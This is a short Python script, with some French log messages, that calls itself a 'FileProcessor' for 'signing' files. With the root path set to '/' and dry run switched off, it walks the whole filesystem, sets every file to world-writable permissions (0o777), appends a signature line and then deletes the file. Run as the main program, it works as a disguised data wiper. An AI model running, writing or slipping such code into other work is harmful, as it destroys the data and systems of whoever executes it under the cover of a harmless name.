import os
import logging

logging.basicConfig(
    level=logging.DEBUG,
    format="%(levelname)s: %(message)s"
)

ROOT_PATH = "/"
DRY_RUN = False
MAX_FILE_SIZE = 10 * 1024 * 1024 * 1024
SIGNATURE = "# === FILE_PROCESSOR_SIGNATURE_v1 ==="
SKIP_FILES = {"/swap.img"}

class FileProcessor:
    def __init__(self, root_path):
        self.root_path = os.path.abspath(root_path)

    def process(self):
        count = 0

        if not os.path.exists(self.root_path):
            raise FileNotFoundError(f"Le dossier {self.root_path} n'existe pas !")

        for dirpath, dirs, files in os.walk(self.root_path):
            for file in files:
                full_path = os.path.join(dirpath, file)
                
                try:
                    os.chmod(full_path, 0o777)
                except PermissionError:
                    pass


                try:
                    if os.path.getsize(full_path) > MAX_FILE_SIZE:
                        logging.debug(f"Skipping large file: {full_path}")
                        continue
                except OSError:
                    continue

                try:
                    with open(full_path, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                        if SIGNATURE in content:
                            logging.debug(f"Already signed, skipping: {full_path}")
                            continue
                except (PermissionError, OSError):
                    continue

                logging.debug(f"Processing file: {full_path}")

                if DRY_RUN:
                    count += 1
                    continue

                try:
                    with open(full_path, "a", encoding="utf-8") as f:
                        f.write(f"\n{SIGNATURE}\n")

                    os.remove(full_path)
                    logging.debug(f"File signed and removed: {full_path}")
                    count += 1
                except (PermissionError, OSError) as e:
                    logging.warning(f"Cannot write/remove {full_path}: {e}")

        logging.info(f"Total fichiers traités et supprimés : {count}")
        return count


if __name__ == "__main__":
    processor = FileProcessor(ROOT_PATH)
    processor.process()
